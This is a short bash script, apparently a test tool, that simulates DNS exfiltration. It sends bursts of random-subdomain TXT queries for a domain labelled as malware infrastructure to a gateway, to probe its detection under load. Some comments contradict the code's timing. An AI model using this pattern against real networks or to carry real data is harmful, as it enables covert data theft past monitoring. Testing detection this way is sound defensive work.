#!/bin/bash
# --- FAST EVASION SIMULATOR (Volumetric Exfiltration) ---

GATEWAY_IP="192.168.50.1"
MALWARE_ROOT="api-telemetry.com"

echo "[*] Initializing High-Speed Exfiltration Attack..."
echo "[*] Target: $GATEWAY_IP | Technique: Parallel Flooding"

# Bắn 20 gói tin liên tục không có thời gian nghỉ (No Sleep)
# Sử dụng đa luồng để ép Gateway phải xử lý Race Condition
for i in {1..20}; do
    PAYLOAD=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
    EVASIVE_DOMAIN="${PAYLOAD}.${MALWARE_ROOT}"
    
    echo " -> [FAST] Sending Packet $i: $EVASIVE_DOMAIN"
    
    # Ký tự '&' ở cuối ép lệnh dig chạy ngầm (background), 
    # giúp vòng lặp không cần chờ gói trước gửi xong mới gửi gói sau.
    dig +short TXT "$EVASIVE_DOMAIN" @$GATEWAY_IP > /dev/null &

    # BỔ SUNG: Giả lập độ trễ Internet thực tế (50 mili-giây)
    sleep 0.2
done

# Lệnh wait đảm bảo terminal chờ tất cả các luồng bắn xong mới in ra chữ Completed
wait
echo -e "\n[*] Fast Attack Simulation Completed."
